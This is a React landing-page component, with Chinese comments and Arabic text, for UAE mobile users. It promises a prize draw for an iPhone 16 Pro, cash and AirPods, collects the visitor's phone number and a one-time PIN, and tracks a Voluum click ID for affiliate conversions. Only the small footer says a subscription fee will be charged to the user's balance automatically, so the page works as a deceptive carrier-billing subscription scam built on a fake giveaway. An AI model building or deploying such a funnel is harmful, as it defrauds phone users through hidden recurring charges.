import { useState, useEffect } from "react";

export default function Home() {
  const [clickId, setClickId] = useState("");
  const [msisdn, setMsisdn] = useState("");
  const [pin, setPin] = useState("");
  const [txid, setTxid] = useState("");
  const [message, setMessage] = useState("");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);

  // 加载时自动捕获 Voluum 的 click_id
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("cid")) setClickId(params.get("cid"));
  }, []);

  // 1. 请求验证码 (智能清洗逻辑)
  async function requestPIN() {
    if (!msisdn) {
      setMessage("يرجى إدخال رقم الهاتف");
      return;
    }
    
    setLoading(true);
    setMessage("جاري التحقق...");

    let cleanMsisdn = msisdn.trim();
    if (cleanMsisdn.startsWith("0")) {
      cleanMsisdn = cleanMsisdn.substring(1);
    }
    if (!cleanMsisdn.startsWith("971")) {
      cleanMsisdn = "971" + cleanMsisdn;
    }

    try {
      const response = await fetch("/api/request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ msisdn: cleanMsisdn, click_id: clickId })
      });

      const data = await response.json();

      if (data.success) {
        setTxid(data.txid);
        setStep(2);
        setMessage("✅ تم إرسال رمز التحقق إلى هاتفك");
      } else {
        setMessage("❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.");
      }
    } catch (error) {
      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
    }
    setLoading(false);
  }

  // 2. 验证并回传转化
  async function verifyPIN() {
    if (!pin) {
      setMessage("يرجى إدخال رمز OTP");
      return;
    }

    setLoading(true);
    setMessage("جاري التأكيد...");

    try {
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ txid, pin, click_id: clickId })
      });

      const data = await response.json();

      if (data.success) {
        setStep(3);
        setMessage("");
      } else {
        setMessage("❌ الرمز غير صحيح، حاول مرة أخرى");
      }
    } catch (error) {
      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
    }
    setLoading(false);
  }

  return (
    <div style={styles.body}>
      <div style={styles.badge}>🇦🇪 عرض حصري للإمارات</div>

      <h1 style={styles.title}>اربح آيفون 16 برو</h1>
      <p style={styles.subtitle}>أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز حصرية</p>

      <div style={styles.gift}>🎁</div>

      {/* 针对手机端缩小的 3 张奖品卡片 */}
      <div style={styles.cards}>
        <div style={styles.card}>
          <img src="https://i.ibb.co/B5tGx9x2/iphone-16.png" style={styles.image} />
          <h3 style={styles.cardText}>iPhone 16</h3>
        </div>
        <div style={styles.card}>
          <img src="https://i.ibb.co/S7WWWXJN/cash.png" style={styles.image} />
          <h3 style={styles.cardText}>AED 10,000</h3>
        </div>
        <div style={styles.card}>
          <img src="https://i.ibb.co/XZbtrpsJ/111851-sp880-airpods-Pro-2nd-gen.png" style={styles.image} />
          <h3 style={styles.cardText}>AirPods Pro</h3>
        </div>
      </div>

      {/* 干净利落的表单框 */}
      <div style={styles.formBox}>
        {step === 1 && (
          <div>
            <h2 style={styles.formTitle}>أدخل رقم هاتفك</h2>
            <div style={styles.phoneBox}>
              <input
                type="tel"
                placeholder="5XXXXXXXX"
                value={msisdn}
                onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
                style={styles.input}
              />
              <div style={styles.country}>+971</div>
            </div>
            <button onClick={requestPIN} disabled={loading} style={styles.yellowButton}>
              {loading ? "جاري الطلب..." : "اربح الآن"}
            </button>
          </div>
        )}

        {step === 2 && (
          <div>
            <h2 style={{...styles.formTitle, color: '#2ecc71'}}>أدخل رمز التأكيد</h2>
            <input
              type="tel"
              placeholder="أدخل رمز OTP"
              value={pin}
              maxLength={4}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
              style={styles.otpInput}
            />
            <button onClick={verifyPIN} disabled={loading} style={styles.greenButton}>
              {loading ? "جاري التأكيد..." : "تأكيد الرمز"}
            </button>
          </div>
        )}

        {step === 3 && (
          <div style={{ padding: "10px 0" }}>
            <h2 style={{ color: "#2ecc71", fontSize: "32px", marginBottom: "15px" }}>🎉 تم الاشتراك بنجاح! 🎉</h2>
            <p style={{ fontSize: "18px", color: "#333", lineHeight: "1.5" }}>لقد دخلت السحب الرسمي بنجاح.<br />سيتم التواصل معك قريباً في حال فوزك!</p>
          </div>
        )}

        <div style={styles.message}>{message}</div>

        <div style={styles.footer}>
          ⚡ عدد الفائزين محدود يومياً
          <br /><br />
          بالمتابعة فإنك توافق على الشروط والأحكام. سيتم خصم رسوم الاشتراك من رصيدك تلقائياً.
        </div>
      </div>
    </div>
  );
}

// 📱 专门针对手机屏幕优化的 CSS 样式 (缩小字号、优化边距)
const styles = {
  body: {
    background: "linear-gradient(to bottom, #7b00b6, #3d0066)",
    minHeight: "100vh",
    padding: "15px",
    textAlign: "center",
    color: "white",
    fontFamily: "Arial, sans-serif",
    direction: "rtl"
  },
  badge: {
    background: "#ffd500",
    color: "#000",
    display: "inline-block",
    padding: "8px 24px",
    borderRadius: "25px",
    fontWeight: "bold",
    fontSize: "14px",
    marginTop: "10px",
    boxShadow: "0 2px 8px rgba(0,0,0,0.2)"
  },
  title: {
    fontSize: "32px",
    marginTop: "20px",
    marginBottom: "10px",
    fontWeight: "900",
    textShadow: "0 2px 4px rgba(0,0,0,0.5)"
  },
  subtitle: {
    fontSize: "16px",
    marginTop: "0",
    lineHeight: "1.4",
    padding: "0 10px",
    color: "#e0e0e0"
  },
  gift: {
    fontSize: "45px",
    margin: "15px 0"
  },
  cards: {
    display: "flex",
    justifyContent: "center",
    gap: "10px",
    flexWrap: "wrap",
    marginBottom: "25px"
  },
  card: {
    width: "30%", // 手机上正好一排平分 3 个
    background: "#8d2be2",
    border: "2px solid #ffd500",
    borderRadius: "15px",
    padding: "10px",
    boxShadow: "0 4px 10px rgba(0,0,0,0.3)"
  },
  image: {
    width: "100%",
    maxWidth: "55px",
    height: "55px",
    objectFit: "contain",
    marginBottom: "5px"
  },
  cardText: {
    fontSize: "12px",
    margin: "0",
    color: "white",
    fontWeight: "bold"
  },
  formBox: {
    background: "#efefef",
    color: "black",
    borderRadius: "25px",
    padding: "25px 15px",
    maxWidth: "100%",
    boxShadow: "0 10px 25px rgba(0,0,0,0.4)"
  },
  formTitle: {
    color: "#7b2be2",
    fontSize: "24px",
    marginBottom: "20px",
    fontWeight: "900"
  },
  phoneBox: {
    display: "flex",
    flexDirection: "row",
    border: "3px solid #cfd1d8",
    borderRadius: "15px",
    overflow: "hidden",
    background: "#ffffff", // 👈 确保整个组合框背景为纯白
    height: "60px",
    direction: "ltr"
  },
  input: {
    flex: 1,
    border: "none",
    fontSize: "22px",
    textAlign: "center",
    fontWeight: "bold",
    outline: "none",
    backgroundColor: "#ffffff", // 👈 强行设置输入框背景为纯白
    color: "#000000" // 👈 强行设置用户输入的 msisdn 数字为纯黑
  },
  country: {
    width: "70px",
    background: "#d9d9df",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontSize: "18px",
    fontWeight: "bold",
    color: "#555"
  },
  yellowButton: {
    width: "100%",
    height: "60px",
    border: "none",
    borderRadius: "15px",
    marginTop: "20px",
    background: "#ffd500",
    color: "black",
    fontSize: "24px",
    fontWeight: "bold",
    cursor: "pointer",
    boxShadow: "0 4px 12px rgba(255,213,0,0.4)"
  },
  otpInput: {
    width: "100%",
    height: "60px",
    borderRadius: "15px",
    border: "3px solid #cfd1d8",
    fontSize: "24px",
    textAlign: "center",
    fontWeight: "bold",
    outline: "none",
    letterSpacing: "8px"
  },
  greenButton: {
    width: "100%",
    height: "60px",
    border: "none",
    borderRadius: "15px",
    marginTop: "20px",
    background: "#2ecc71",
    color: "white",
    fontSize: "24px",
    fontWeight: "bold",
    cursor: "pointer",
    boxShadow: "0 4px 12px rgba(46,204,113,0.4)"
  },
  message: {
    marginTop: "15px",
    color: "#e74c3c",
    fontSize: "16px",
    fontWeight: "bold",
    minHeight: "20px"
  },
  footer: {
    marginTop: "20px",
    fontSize: "12px",
    lineHeight: "1.5",
    color: "#666"
  }
};